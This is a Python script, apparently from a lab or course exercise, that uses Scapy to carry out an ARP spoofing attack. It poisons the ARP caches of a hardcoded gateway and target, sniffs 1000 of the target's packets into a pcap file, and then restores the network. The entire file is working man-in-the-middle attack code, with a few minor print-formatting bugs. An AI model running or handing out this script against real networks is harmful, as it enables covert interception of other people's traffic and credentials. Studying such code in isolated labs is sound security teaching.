import signal
import threading
import conf as configuration
from scapy.all import *
from scapy.layers.l2 import ARP

gateway_ip = "198.7.0.2"
target_ip = "198.7.0.1"
packet_count = 1000
configuration.iface = "en1"
configuration.verb = 0

gateway_mac = "02:42:c6:0a:00:03"
target_mac = "02:42:c6:0a:00:02"


def retrieve_mac(ip_address):
    resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=2, timeout=10)
    for s, r in resp:
        return r[ARP].hwsrc
    return None


def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip, hwsrc=target_mac, psrc=target_ip), count=5)
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip, hwsrc=gateway_mac, psrc=gateway_ip), count=5)

    os.system("sysctl -w net.inet.ip.forwarding=0")
    os.kill(os.getpid(), signal.SIGTERM)


def poison_arp(gateway_ip, gateway_mac, target_ip, target_mac):
    print("ARP start")
    try:
        while True:
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip))
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip))
            time.sleep(2)
    except KeyboardInterrupt:
        print("ARP SP stopped. Restoring network")
        restore_network(gateway_ip, gateway_mac, target_ip, target_mac)


def execute_arp_spoofing():
    print("Start spoofing ")
    print("Gateway IP: {gateway_ip}")
    print("Target IP: {target_ip}")
    print("Gateway MAC: {gateway_mac}")
    print(f"Target MAC: {target_mac}")

    poison_thread = threading.Thread(target=poison_arp, args=(gateway_ip, gateway_mac, target_ip, target_mac))
    poison_thread.start()

    try:
        sniff_filter = "ip host " + target_ip
        print(f"Start. Packet Count: {packet_count}. Filter: {sniff_filter}")
        packets = sniff(filter=sniff_filter, iface=configuration.iface, count=packet_count)
        wrpcap(target_ip + "", packets)
        print(f"Stop .Restituire retea!")
        restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
    except KeyboardInterrupt:
        print(f" Stop .Restituire retea!")
        restore_network(gateway_ip, gateway_mac, target_ip, target_mac)


if __name__ == '__main__':
    execute_arp_spoofing()
